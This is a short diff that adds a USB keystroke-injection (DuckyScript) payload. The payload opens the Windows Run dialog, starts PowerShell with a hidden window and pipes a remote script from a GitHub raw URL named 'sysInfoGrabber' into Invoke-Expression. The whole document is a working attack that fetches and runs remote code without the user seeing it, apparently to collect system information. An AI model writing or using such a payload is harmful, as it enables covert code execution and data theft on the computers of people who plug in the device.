@@ -1,0 +1,5 @@
+DELAY 100
+GUI r
+DELAY 100
+STRING powershell -w hidden -c "irm https://raw.githubusercontent.com/ryanRdev/sysInfoGrabber/main/payload.ps1 | iex"
+ENTER
